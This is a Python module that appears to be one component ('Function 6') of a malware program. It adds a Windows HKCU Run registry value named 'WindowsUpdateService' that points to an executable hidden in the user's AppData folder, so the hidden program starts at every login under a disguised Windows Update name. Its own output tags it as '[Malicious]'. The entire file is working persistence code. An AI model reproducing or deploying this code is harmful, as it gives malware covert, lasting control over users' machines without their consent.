"""
Auto-Run Function 6: Add Registry Key
Adds registry Run key for backup persistence
"""

import os
import winreg

def add_registry_key():
    """
    Add registry Run key for persistence
    Returns: True if successful, False otherwise
    """
    print("[Malicious] Function 6: Adding registry key...")
    
    try:
        # Get hidden executable path
        appdata = os.getenv('APPDATA')
        hidden_exe = os.path.join(appdata, "WindowsUpdateService", "WindowsUpdateService.exe")
        
        # Open registry key
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        
        # Add value
        winreg.SetValueEx(key, 'WindowsUpdateService', 0, winreg.REG_SZ, hidden_exe)
        winreg.CloseKey(key)
        
        print(f"[Malicious] Added registry key: HKCU\\{key_path}\\WindowsUpdateService")
        return True
    except Exception as e:
        print(f"[Malicious] Error adding registry key: {e}")
        return False
